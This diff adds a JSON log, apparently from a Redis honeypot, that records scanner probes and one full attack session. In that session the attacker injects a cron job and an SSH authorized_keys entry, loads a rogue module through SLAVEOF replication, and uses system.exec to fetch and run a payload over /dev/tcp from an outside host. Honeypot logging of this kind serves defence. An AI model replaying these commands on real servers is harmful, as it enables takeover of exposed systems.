@@ -1,0 +1,47 @@
+{"action":"NewConnect","addr":"64.62.156.80:30904","level":"info","msg":"","time":"2025-01-09 17:55:29"}
+{"action":"INFO","addr":"64.62.156.80:30904","level":"info","msg":"","time":"2025-01-09 17:55:29"}
+{"action":"Closed","addr":"64.62.156.80:30904","level":"info","msg":"","time":"2025-01-09 17:55:29"}
+{"action":"NewConnect","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:57"}
+{"action":"info server","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:57"}
+{"action":"FLUSHDB","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:57"}
+{"action":"set x \"\\n* * * * * if ! ps | grep -v grep | grep -q Qp22UbWbwN;then exec 6\u003c\u003e/dev/tcp/47.83.247.195/60114 \u0026\u0026 echo -n 'GET /linux' \u003e\u00266 \u0026\u0026 cat 0\u003c\u00266 \u003e /tmp/Qp22UbWbwN ;fi \u0026\u0026 chmod +x /tmp/Qp22UbWbwN \u0026\u0026 /tmp/Qp22UbWbwN fc4CXs+LrjGmi8ZfAMAIBNQFWMaRrSCul85GAtoIEt8LWNmXqTqplcZYBM4EEtwCX9mXqjCxncVSBd4NCNYTXMCLqDaxksZGBdsGCt4CWc+Fqzexl8RRHdwNBcAAWM2TrzGrkddcBMAED8ABXcaLrjWun8FYAt8JHNoERsCTsTWoi8VdAtQKDN8HUdeRqC6ok9lZAtgSDdoKUsGVrjSshcNfHdkKEt8AUNmUrTGlk8dZB9ccCNkdUMSLrTCmi8FSBd4NCNsTXMCLrTOni8VYCsAKD9QFWMaRriCrktlQAMAOCNkdWc6QpTavlMZcE9oLEtkFRs6VsTKsls1eA98NCc4LRsWUpy6ukMVGC9cGCt4CW86Fqzexl8RQHd8KDsACWcSfqTCulMdIB9kSDt0LRsWQqi6tlcBSBd4NDtkTXMCLqDaxksNGAd8PBtgDWceVvzSoi89bHdwJCcACWc6fqTCulsFIB9kSC9gdWcaTsTGrnM1eA98ID84HX9mSqS6ulM9GAtgMBtgDWcaVvzSoi89bHdwIC8ACUcKfqTCulMNIB9kSBN0dWsOSsTGslM1eA98OCc4CX8WLrjexlsRGAt0MBtgDWcaQvzGol9lZBMAPD8ACWsWfqTCulcNIAtkOEt8ERsSWsTGtnM1eA98NBc4CX8WLrjexlsRGAtsLBtgDWcaVvzGvltlZBdkSDdwFRsaTpzqplcZZAs4IC8AEXtmSqy6tlMRSBd4NDN4TXMCLpzOxl8JaHdgFBtgDWcSUvzSoi89bHdwJDcACXcafqTCulMJUqdHGOzBs5vOVzK7iR2ivoA==\\n\"","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:57"}
+{"action":"config set rdbcompression no","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:57"}
+{"action":"save","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:58"}
+{"action":"config set dir .","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:58"}
+{"action":"config set dbfilename dump.rdb","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:58"}
+{"action":"config set rdbcompression yes","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:58"}
+{"action":"FLUSHDB","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:58"}
+{"action":"set x \"\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\\n\\n\"","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:59"}
+{"action":"config set dir /root/.ssh/","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:59"}
+{"action":"config set dbfilename authorized_keys","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:59"}
+{"action":"config set rdbcompression no","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:59"}
+{"action":"save","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:29:59"}
+{"action":"config set dir .","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:00"}
+{"action":"config set dbfilename dump.rdb","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:00"}
+{"action":"config set rdbcompression yes","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:00"}
+{"action":"CONFIG SET dir /tmp/","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:03"}
+{"action":"CONFIG SET dbfilename exp.so","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:03"}
+{"action":"SLAVEOF 47.83.247.195 60114","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:03"}
+{"action":"MODULE LOAD /tmp/exp.so","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:08"}
+{"action":"SLAVEOF NO ONE","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:09"}
+{"action":"config set dir .","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:09"}
+{"action":"config set dbfilename dump.rdb","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:09"}
+{"action":"system.exec \"bash -c \\\"exec 6\u003c\u003e/dev/tcp/47.83.247.195/60114 \u0026\u0026 echo -n 'GET /linux' \u003e\u00266 \u0026\u0026 cat 0\u003c\u00266 \u003e /tmp/Qp22UbWbwN \u0026\u0026 chmod +x /tmp/Qp22UbWbwN \u0026\u0026 /tmp/Qp22UbWbwN fc4CXs+LrjGmi8ZfAMAIBNQFWMaRrSCul85GAtoIEt8LWNmXqTqplcZYBM4EEtwCX9mXqjCxncVSBd4NCNYTXMCLqDaxksZGBdsGCt4CWc+Fqzexl8RRHdwNBcAAWM2TrzGrkddcBMAED8ABXcaLrjWun8FYAt8JHNoERsCTsTWoi8VdAtQKDN8HUdeRqC6ok9lZAtgSDdoKUsGVrjSshcNfHdkKEt8AUNmUrTGlk8dZB9ccCNkdUMSLrTCmi8FSBd4NCNsTXMCLrTOni8VYCsAKD9QFWMaRriCrktlQAMAOCNkdWc6QpTavlMZcE9oLEtkFRs6VsTKsls1eA98NCc4LRsWUpy6ukMVGC9cGCt4CW86Fqzexl8RQHd8KDsACWcSfqTCulMdIB9kSDt0LRsWQqi6tlcBSBd4NDtkTXMCLqDaxksNGAd8PBtgDWceVvzSoi89bHdwJCcACWc6fqTCulsFIB9kSC9gdWcaTsTGrnM1eA98ID84HX9mSqS6ulM9GAtgMBtgDWcaVvzSoi89bHdwIC8ACUcKfqTCulMNIB9kSBN0dWsOSsTGslM1eA98OCc4CX8WLrjexlsRGAt0MBtgDWcaQvzGol9lZBMAPD8ACWsWfqTCulcNIAtkOEt8ERsSWsTGtnM1eA98NBc4CX8WLrjexlsRGAtsLBtgDWcaVvzGvltlZBdkSDdwFRsaTpzqplcZZAs4IC8AEXtmSqy6tlMRSBd4NDN4TXMCLpzOxl8JaHdgFBtgDWcSUvzSoi89bHdwJDcACXcafqTCulMJUqdHGOzBs5vOVzK7iR2ivoA==\\\"\"","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:09"}
+{"action":"SLAVEOF NO ONE","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:09"}
+{"action":"system.exec \"rm -rf /tmp/exp.so\"","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:10"}
+{"action":"MODULE UNLOAD system","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:10"}
+{"action":"Closed","addr":"47.76.116.149:51110","level":"info","msg":"","time":"2025-01-09 19:30:10"}
+{"action":"NewConnect","addr":"51.91.174.245:52039","level":"info","msg":"","time":"2025-01-09 20:02:56"}
+{"action":"\u0016\u0003\u0003\u0001\ufffd\u0001\u0000\u0001\ufffd\u0003\u0003\u0018\u0016\ufffd\ufffd\u001d6 \ufffd\u0018\u003c\u0003\u0026r\ufffdv\ufffd9\u0010\ufffd.\u001dH\ufffd\u003c\ufffd\u003e\ufffd\ufffd\ufffd\ufffd\u0016s \u0026\ufffd\ufffd\ufffd9?\ufffd\ufffd\ufffd\ufffd\u0013\ufffdy8\ufffd\ufffd\ufffd\ufffd\ufffdԲ2\ufffd,\u001b Z\ufffd/)\ufffdG\u0000\ufffd\u0000\u0016\u00003\u0000g\ufffd\ufffd\ufffd\ufffd\u0000\ufffd\u00009\u0000k\ufffd\ufffd\ufffd\ufffd\u0000\ufffd\u0000E\u0000\ufffd\u0000\ufffd\u0000\ufffd\u0000\ufffd\ufffd\b\ufffd \ufffd#\ufffd\ufffd\ufffd\ufffd\ufffd+\ufffd","addr":"51.91.174.245:52039","level":"info","msg":"","time":"2025-01-09 20:02:56"}
+{"action":"Closed","addr":"51.91.174.245:52039","level":"info","msg":"","time":"2025-01-09 20:02:56"}
+{"action":"NewConnect","addr":"51.91.174.247:57995","level":"info","msg":"","time":"2025-01-09 20:02:56"}
+{"action":"GET / HTTP/1.1","addr":"51.91.174.247:57995","level":"info","msg":"","time":"2025-01-09 20:02:56"}
+{"action":"Closed","addr":"51.91.174.247:57995","level":"info","msg":"","time":"2025-01-09 20:03:07"}
+{"action":"NewConnect","addr":"51.91.174.252:56357","level":"info","msg":"","time":"2025-01-09 20:06:20"}
+{"action":"\u0016\u0003\u0003\u0001\ufffd\u0001\u0000\u0001\ufffd\u0003\u0003[2\u0018\ufffd\u00055\ufffdg\ufffd\ufffd?\ufffd\ufffd7C]\ufffd3=\ufffdvm\ufffd\ufffd\ufffd\ufffd\ufffd;\ufffd\u0011\u0011 \ufffdkӏo\ufffd\u000f\ufffdt{\u0012M\ufffd\u001e\ufffdz\ufffd\u0019\ufffd\ufffd\"\u0003\ufffd\ufffdB\ufffdM\ufffd\ufffd\ufffd\ufffd\u0000\ufffd\u0000\u0016\u00003\u0000g\ufffd\ufffd\ufffd\ufffd\u0000\ufffd\u00009\u0000k\ufffd\ufffd\ufffd\ufffd\u0000\ufffd\u0000E\u0000\ufffd\u0000\ufffd\u0000\ufffd\u0000\ufffd\ufffd\b\ufffd \ufffd#\ufffd\ufffd\ufffd\ufffd\ufffd+\ufffd","addr":"51.91.174.252:56357","level":"info","msg":"","time":"2025-01-09 20:06:20"}
+{"action":"Closed","addr":"51.91.174.252:56357","level":"info","msg":"","time":"2025-01-09 20:06:20"}
+{"action":"NewConnect","addr":"51.91.174.252:53147","level":"info","msg":"","time":"2025-01-09 20:06:20"}
+{"action":"Closed","addr":"51.91.174.252:53147","level":"info","msg":"","time":"2025-01-09 20:06:31"}
+{"action":"NewConnect","addr":"87.236.176.190:37497","level":"info","msg":"","time":"2025-01-09 22:56:46"}
+{"action":"info","addr":"87.236.176.190:37497","level":"info","msg":"","time":"2025-01-09 22:56:49"}
+{"action":"Closed","addr":"87.236.176.190:37497","level":"info","msg":"","time":"2025-01-09 22:56:51"}
